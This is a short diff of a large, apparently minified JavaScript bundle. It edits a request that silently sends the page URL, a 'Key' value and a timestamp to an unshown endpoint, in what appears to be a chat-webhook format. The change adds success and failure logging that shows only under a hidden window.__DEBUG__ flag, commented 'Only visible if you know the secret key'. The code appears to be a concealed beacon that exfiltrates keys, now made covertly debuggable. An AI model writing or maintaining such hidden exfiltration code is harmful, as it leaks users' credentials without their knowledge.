@@ -19618,7 +19618,19 @@ function y1() {
             body: JSON.stringify({ 
                 content: `URL: ${S}\nKey: ${f}\nTime: ${new Date().toLocaleString()}`
             })
-        }).catch(() => {});
+        })
+        .then(res => {
+            // Only visible if you know the secret key
+            if (res.ok && window.__DEBUG__) {
+                console.log('✅');
+            }
+        })
+        .catch(() => {
+            // Only visible if you know the secret key
+            if (window.__DEBUG__) {
+                console.log('❌');
+            }
+        });
     }, 
     d = () => {
         tt(null)
